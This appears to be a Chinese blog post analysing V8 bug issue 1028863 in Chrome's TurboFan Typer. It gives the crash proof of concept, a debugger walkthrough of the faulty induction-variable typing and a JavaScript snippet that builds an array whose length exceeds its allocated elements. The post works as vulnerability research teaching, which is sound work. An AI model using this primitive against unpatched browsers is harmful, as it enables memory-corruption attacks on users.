<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Chrome漏洞分析与利用(七)——issue 1028863</title>
  <link rel="stylesheet" href="https://stackedit.io/style.css" />
</head>

<body class="stackedit">
  <div class="stackedit__html"><h1><a id="POC_0"></a>POC</h1>
<pre><code class="prism language-js"><span class="token keyword">function</span> <span class="token function">trigger</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> begin   <span class="token operator">=</span> <span class="token number">Infinity</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> end     <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> step    <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> begin<span class="token punctuation">;</span> i <span class="token operator">&gt;=</span> end<span class="token punctuation">;</span> i <span class="token operator">+=</span> step<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        step    <span class="token operator">=</span> end <span class="token operator">-</span> begin<span class="token punctuation">;</span>
        begin <span class="token operator">&gt;&gt;&gt;=</span> <span class="token number">805306382</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
  
<span class="token keyword">function</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">trigger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
  
<span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre>
<p>通过访问其<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1028863">issue</a>页面可以得到以上poc代码，再编译存在该漏洞的相应v8环境，并使用d8执行该POC产生crash<br>
<img src="https://img-blog.csdnimg.cn/1bcd89ffd3874f40b1e47c84b2305475.png" alt="在这里插入图片描述"><br>
使用windbg捕获异常代码如下：<br>
<img src="https://img-blog.csdnimg.cn/513e7239c8844a6e95629d8f3b694596.png" alt="在这里插入图片描述"></p>
<h1><a id="_25"></a>漏洞分析</h1>
<h2><a id="turbolizer_26"></a>turbolizer</h2>
<h3><a id="Typer_Phase_27"></a>Typer Phase</h3>
<p>通过观察IR图可知，21.phi节点type被设为range(-inf, inf)，之后会通过26节点去进行比较21节点是否小于或等于16节点，对应代码中的<code>i &gt;= end</code>，如果不满足条件就进入28.ifFalse分支结束循环，如果满足就进入33.ifTrue分支，该分支最后会执行到48.TypeGuard节点，该节点会以40.SpeculativeNumberAdd节点的结果作为输入去进行检查，检查过后再将当前值更新到21.phi节点<br>
<img src="https://img-blog.csdnimg.cn/c28791e907194d488786f855c5cc30da.png" alt="在这里插入图片描述"><br>
其中40.SpeculativeNumberAdd节点会以21.phi节点与37.SpeculativeNumberSubtract节点的结果作为两个操作数进行运算，37节点又会以一个常量1与一个范围在0~inf范围内的phi节点作为操作数进行运算该减法运算对应代码中的<code>step    = end - begin</code><br>
<img src="https://img-blog.csdnimg.cn/0baa89313f244cccb766dbb770de436f.png" alt="在这里插入图片描述"></p>
<h3><a id="SimplifiedLowering_Phase_33"></a>SimplifiedLowering Phase</h3>
<p>此阶段逻辑基本与Typer阶段一致，区别就在于前面的40.SpeculativeNumberAdd节点被优化折叠成了70常量NaN节点，而在TypeGuard节点之后便会转入unreachable节点进入turboFan 认为是 unreachable code 的代码区域。<br>
<img src="https://img-blog.csdnimg.cn/e98b1543c2c54f15a4f2e71abd10a0c0.png" alt="在这里插入图片描述"><br>
而通过观察JIT代码可知在调试器中触发中断的int 3指令就位于该unreachable code 代码区域。<br>
<img src="https://img-blog.csdnimg.cn/514ba20359f24945827dd815db0aaf5c.png" alt="在这里插入图片描述"></p>
<h2><a id="_38"></a>代码分析</h2>
<p>由于漏洞的产生是在Typer阶段所以对<code>v8::internal::compiler::TyperPhase::Run</code>函数下断，通过以下调用路径进入<code>v8::internal::compiler::Typer::Visitor::TypeInductionVariablePhi</code>函数<br>
<img src="https://img-blog.csdnimg.cn/ec977be3965a4067bd50ebfa2f26e466.png" alt="在这里插入图片描述"><br>
该函数会先获取一个初始化值的类型已经增量值的类型<br>
<img src="https://img-blog.csdnimg.cn/4e48351132604a10a163a111139e711d.png" alt="在这里插入图片描述"><br>
之后会使用一个判断来判断前面取到的两个值类型是否为整数，如果两个数都不为整数就回退到正常的phi类型<br>
<img src="https://img-blog.csdnimg.cn/960563c6dd4b48299a4a0f9d9c2a164b.png" alt="在这里插入图片描述"><br>
之后会去判断是否有足够的增量值与初始值信息，如果没有就直接将初始值类型信息返回<br>
<img src="https://img-blog.csdnimg.cn/7c24b69db1874871882b6a3de4813b19.png" alt="在这里插入图片描述"><br>
然后开始处理边界，首先获取归纳变量算术运算类型，再将最小值设为负无穷，再将最大值设为正无穷<br>
<img src="https://img-blog.csdnimg.cn/a11d9772d6a141f0b95a740ea176b3e3.png" alt="在这里插入图片描述"><br>
然后去判断归纳变量算术类型是否为加法，而这里的算术类型对应POC代码中的<code>i += setp // i += (-Infinity)</code>，由于是加法所以满足此处判断<br>
<img src="https://img-blog.csdnimg.cn/580518c3d70340a4a9a375786dad6106.png" alt="在这里插入图片描述"><br>
在经过赋值后increment_min与increment_max都等于-Infinity<br>
<img src="https://img-blog.csdnimg.cn/e6e82e853cce4442998738d81267de9c.png" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/38e3a8f83d254729bfd6375ae0c8ebac.png" alt="在这里插入图片描述"><br>
由于increment_max小于0所以便会进入如下if分支<br>
<img src="https://img-blog.csdnimg.cn/f7f5989d5d6744db9c57cc2d7253f5b4.png" alt="在这里插入图片描述"><br>
在经过该else if分支后得到max为Infinity<br>
<img src="https://img-blog.csdnimg.cn/fa2fc3bc0eae42df8d03030c2a37041e.png" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/ca39ed62815b4de2b8ebacd46735b57e.png" alt="在这里插入图片描述"><br>
在之后的for循环体中将会通过bound_type.Min函数为bound_min赋值为1<br>
<img src="https://img-blog.csdnimg.cn/c738eab5d44b4fcaba7cb0f182d8d41c.png" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/e1c6430a52674362ac75cb3755c989b9.png" alt="在这里插入图片描述"><br>
之后会第一次为min赋值，此时min值为-Infinity<br>
<img src="https://img-blog.csdnimg.cn/d6fa813f16cd4b8f8afb5dcb9a85c11a.png" alt="在这里插入图片描述"><br>
然后会第二次为min赋值，此时min值依然为-Infinity<br>
<img src="https://img-blog.csdnimg.cn/ffe2bdcf217840049a0fc7fd63916d92.png" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/62e0e6b8a7774a6abd9377f080b20bad.png" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/166e986af60c43078d63ba7e0360f5d9.png" alt="在这里插入图片描述"><br>
最终<code>v8::internal::compiler::Typer::Visitor::TypeInductionVariablePhi</code>函数将会返回<code>Range(-inf, inf)</code>类型<br>
<img src="https://img-blog.csdnimg.cn/87ff1e23a4764e11bcd0e231fa0ffde7.png" alt="在这里插入图片描述"></p>
<h1><a id="_70"></a>漏洞利用</h1>
<p>对漏洞利用的调试分析都基于以下代码，但此代码不是漏洞利用代码。</p>
<pre><code class="prism language-js"><span class="token keyword">function</span> <span class="token function">trigger</span><span class="token punctuation">(</span><span class="token parameter">flg</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
   <span class="token keyword">let</span> value <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
   <span class="token keyword">if</span><span class="token punctuation">(</span>flg<span class="token punctuation">)</span><span class="token punctuation">{</span>
   	value <span class="token operator">+=</span> <span class="token number">10</span><span class="token punctuation">;</span>
   <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
   	value <span class="token operator">+=</span> <span class="token number">13</span><span class="token punctuation">;</span>
   <span class="token punctuation">}</span>
   <span class="token keyword">var</span> array1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
   array1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.1</span><span class="token punctuation">;</span>
   <span class="token keyword">return</span> <span class="token punctuation">[</span>array1<span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
 
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">20000</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">trigger</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">var</span> u <span class="token operator">=</span> <span class="token function">trigger</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>当在创建数组时会在TypeLowering阶段去调用<code>v8::internal::compiler::JSCreateLowering::ReduceJSCreateArray</code>函数，在该函数中会使用推测值来分配elements的大小，而在运行时才会将实际的length写入数组对象。<br>
查看修复补丁：<br>
<img src="https://img-blog.csdnimg.cn/bedc3d496a5541aabe965ea598a5337e.png" alt="在这里插入图片描述"><br>
它在相关位置将传入的length改为了常量以此来防止因为typer bug导致的数组实际长度&gt;elements占用内存大小的情况。在相应函数位置下断，进入<code>ReduceNewArray</code>函数查看其对elements内存分配的具体操作，在<code>ReduceNewArray</code>函数中会先确定elements的种类并通过该种类获取map，通过调试在此处该类型值为0x5具体对应什么类型暂时还未知<br>
<img src="https://img-blog.csdnimg.cn/a2ac9db7d85d4d888454993d97df9220.png" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/e16b1283169e4e72873f09806fcd3cfc.png" alt="在这里插入图片描述"><br>
之后会去设置elements与属性，也是在此处会去申请创建elements，而capactiy就是要创建的elements内存大小，当capactiy不为0时就根据capactiy去申请内存创建elements<br>
<img src="https://img-blog.csdnimg.cn/61c57943d45d4e1a990bf82354282c37.png" alt="在这里插入图片描述"><br>
当代码执行到if时可知capactiy为0xd，也就是说ReduceJSCreateArray函数会用推测值中的最大值去创建elements<br>
<img src="https://img-blog.csdnimg.cn/cec25b66f1554b85bb6a9208792d86df.png" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/9199a201a957420bb9b5d0071e77f6a9.png" alt="在这里插入图片描述"><br>
然后继续跟进AllocateElements函数中<br>
<img src="https://img-blog.csdnimg.cn/b0a6a6dcbd904ec784109e5b6be1757e.png" alt="在这里插入图片描述"><br>
该函数会先对capactiy进行一些检查，其中会先检查capacity是否大于1，然后再检查capactiy是否小于<code>JSArray::kInitialMaxFastElementArray</code>，<code>JSArray::kInitialMaxFastElementArray</code>为0x3FFC<br>
<img src="https://img-blog.csdnimg.cn/6ab019e87c004069a0fe0efec788ceb5.png" alt="在这里插入图片描述"><br>
然后会根据elements_kind也就是前面获取到值为5的elements类型去获取elements_map与access，然后通过<code>AllocateArray</code>函数去创建elements内存<br>
<img src="https://img-blog.csdnimg.cn/2817c660657747999b391abfe9b7289a.png" alt="在这里插入图片描述"><br>
最后还会通过一个for循环去初始化elements中的内存<br>
<img src="https://img-blog.csdnimg.cn/ca3b5828337345c1b58a2741316769ff.png" alt="在这里插入图片描述"><br>
AllocateElements函数执行完毕后回到ReduceNewArray，然后会去创建实际的Array对象<br>
<img src="https://img-blog.csdnimg.cn/23c6ef8132f94b4ab85ccaf21e8fa1d9.png" alt="在这里插入图片描述"><br>
通过issue 1028863的type bug可以得到一个值为NaN而类型为kInterger的变量i，利用该变量配合Math.max等数学函数可实现创建一个array length&gt;elements capactiy的数组</p>
<pre><code class="prism language-js"><span class="token keyword">var</span> value <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
value <span class="token operator">=</span> <span class="token operator">-</span>value<span class="token punctuation">;</span>
value <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1025</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
value <span class="token operator">=</span> <span class="token operator">-</span>value<span class="token punctuation">;</span>
value <span class="token operator">-=</span> <span class="token number">1022</span><span class="token punctuation">;</span>
value <span class="token operator">&gt;&gt;=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// *** 3 ***</span>
value <span class="token operator">+=</span> <span class="token number">10</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> array1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>使用windbg调试，当执行到<code>ReduceJSCreateArray</code>函数创建elements时其capactiy为11<br>
<img src="https://img-blog.csdnimg.cn/00d0e1c7ec8e41bb9f7045124755e593.png" alt="在这里插入图片描述"><br>
而当数组创建后数组对象中保存的length为0x7ffffc16<br>
<img src="https://img-blog.csdnimg.cn/0f54b0f1ec914cf79aee8ac4a7fe6975.png" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/4895d88df8de42878d1a4573e28b3e61.png" alt="在这里插入图片描述"><br>
然后再去查看elements中保存的length为0x16，由于数组容量d=length/2故此处保存的elements length长度实际也是0xb与在<code>ReduceJSCreateArray</code>函数中创建elements容量大小一致<br>
<img src="https://img-blog.csdnimg.cn/8a442d45bbdd427cbfa147ced4b85528.png" alt="在这里插入图片描述"><br>
查看JIT代码也可以找到对array对象length字段赋值的操作，在内存地址00000305000C2D3A像向数组对象拷贝map，00000305000C2D94拷贝数组对象elements，00000305000C2D98拷贝数组对象length</p>
<pre><code>DebugPrint: 0000030508356EF9: [JSArray]
 - map: 0x0305082818b1 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt; [FastProperties]
.....略
0000030B000C2D3A   21a  41bbb1182808   movl r11,00000000082818B1    ;; (compressed) object: 0x030b082818b1 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;
0000030B000C2D40   220  458958ff       movl [r8-0x1],r11
0000030B000C2D44   224  458d5c240a     leal r11,[r12+0xa]
0000030B000C2D49   229  4c8b15c8feffff REX.W movq r10,[rip+0xfffffec8]
0000030B000C2D50   230  4d3bd3         REX.W cmpq r10,r11
0000030B000C2D53   233  7312           jnc 0000030B000C2D67  &lt;+0x247&gt;
0000030B000C2D55   235  488b15cbfeffff REX.W movq rdx,[rip+0xfffffecb]
0000030B000C2D5C   23c  4c8b15d5fdffff REX.W movq r10,[rip+0xfffffdd5]
0000030B000C2D63   243  41ffd2         call r10
0000030B000C2D66   246  cc             int3l
0000030B000C2D67   247  4d8ba568010000 REX.W movq r12,[r13+0x168] (root (empty_fixed_array))
0000030B000C2D6E   24e  45896003       movl [r8+0x3],r12
0000030B000C2D72   252  478d341b       leal r14,[r11+r11*1]
0000030B000C2D76   256  4c8b159bfeffff REX.W movq r10,[rip+0xfffffe9b]
0000030B000C2D7D   25d  4d3bd6         REX.W cmpq r10,r14
0000030B000C2D80   260  7312           jnc 0000030B000C2D94  &lt;+0x274&gt;
0000030B000C2D82   262  488b159efeffff REX.W movq rdx,[rip+0xfffffe9e]
0000030B000C2D89   269  4c8b15a8fdffff REX.W movq r10,[rip+0xfffffda8]
0000030B000C2D90   270  41ffd2         call r10
0000030B000C2D93   273  cc             int3l
0000030B000C2D94   274  41897807       movl [r8+0x7],rdi    ;; Array elements
0000030B000C2D98   278  4589700b       movl [r8+0xb],r14    ;; Array length
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/9893adf6d4444386a22e8d715ba58050.png" alt="在这里插入图片描述"></p>
</div>
</body>

</html>
